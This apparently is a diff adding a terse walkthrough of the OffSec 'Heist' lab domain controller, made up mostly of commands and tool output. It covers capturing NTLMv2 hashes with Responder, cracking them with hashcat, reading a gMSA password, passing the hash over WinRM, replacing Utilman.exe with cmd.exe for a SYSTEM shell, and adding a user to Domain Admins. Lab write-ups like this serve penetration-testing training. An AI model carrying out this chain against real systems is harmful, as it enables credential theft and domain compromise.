@@ -1,0 +1,126 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.249.165 > Heist.txt
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-24 04:58:32Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC01.heist.offsec
+| Issuer: commonName=DC01.heist.offsec
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-05-23T04:54:36
+| Not valid after:  2026-11-22T04:54:36
+| MD5:     de4e 0a8e c6d4 37b7 1803 3d70 36f0 b6e8
+| SHA-1:   f9d4 cc6e 62d7 aa6e 1ba3 afb2 f35c 1a9b 20ef 459a
+|_SHA-256: 388b 76da 9454 97a6 7aae dc4f ac48 0fe7 5159 4a53 922a 6c4a 3619 170d 2ad0 ca09
+| rdp-ntlm-info: 
+|   Target_Name: HEIST
+|   NetBIOS_Domain_Name: HEIST
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: heist.offsec
+|   DNS_Computer_Name: DC01.heist.offsec
+|   DNS_Tree_Name: heist.offsec
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-05-24T04:59:20+00:00
+|_ssl-date: 2026-05-24T05:00:00+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
+|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
+|_http-title: Super Secure Web Browser
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+49759/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-05-24T04:59:21
+|_  start_date: N/A
+
+
+http://192.168.249.165:8080
+Find a websearch page.
+# Setup responder
+$ responder -I tun0 -wd 
+# Key in 192.168.45.218 to search field
+
+[HTTP] NTLMv2 Client   : 192.168.249.165
+[HTTP] NTLMv2 Username : HEIST\enox
+[HTTP] NTLMv2 Hash     : enox::HEIST:NTLMv2hash
+$ hashcat -m 5600 enoxNTLMv2 /usr/share/wordlists/rockyou.txt
+enox:california
+
+$ nxc winrm 192.168.249.165 -u enox -p 'california'
+WINRM       192.168.249.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)
+
+# enox is groupmember for Web Admins which have ReadGMSPassword to svc_apache$
+https://github.com/ricardojba/Invoke-GMSAPasswordReader/
+*Evil-WinRM* PS C:\temp> . .\Invoke-GMSAPasswordReader.ps1
+*Evil-WinRM* PS C:\temp> Invoke-GMSAPasswordReader -Command "--AccountName svc_apache$"
+Calculating hashes for Old Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 037AE0A6176EB04FD4C7AECEB0C4327E
+[*]       aes128_cts_hmac_sha1 : 4CBAA41110A1C11A787B3B007511BE64
+[*]       aes256_cts_hmac_sha1 : 337BDE8B0B552127E854D423A2B5293DC6091F71C5D76E373341959882AFFFE8
+[*]       des_cbc_md5          : 7964FE5D51E5869D
+
+Calculating hashes for Current Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 73FB904DF1599735B9D0B3CC969FAC3C
+[*]       aes128_cts_hmac_sha1 : 6E3C699196F3D8CD023333F656DAA318
+[*]       aes256_cts_hmac_sha1 : 9B56C815A37F943DFDF477904D983FA5ADEEF3101931BC496F13419275810E0F
+[*]       des_cbc_md5          : 94B5011975EAF454
+
+# Pass-the-Hash
+$ nxc winrm 192.168.249.165 -u 'svc_apache$' -H '73FB904DF1599735B9D0B3CC969FAC3C'
+WINRM       192.168.249.165 5985   DC01             [+] heist.offsec\svc_apache$:73FB904DF1599735B9D0B3CC969FAC3C (Pwn3d!)
+
+$ evil-winrm -i 192.168.249.165 -u 'svc_apache$' -H '73FB904DF1599735B9D0B3CC969FAC3C'
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami
+heist\svc_apache$
+
+cd C:\windows\system32
+ren Utilman.exe Utilman.old  # rename function to hijack Utilman.exe
+ren cmd.exe Utilman.exe
+
+$ rdesktop 192.168.249.165
+Win+U 
+activate a nt/system cmd shell.
+
+net groups "Domain Admin" enox /add # add enox to domain admin
+
+Now enox is domain admin.
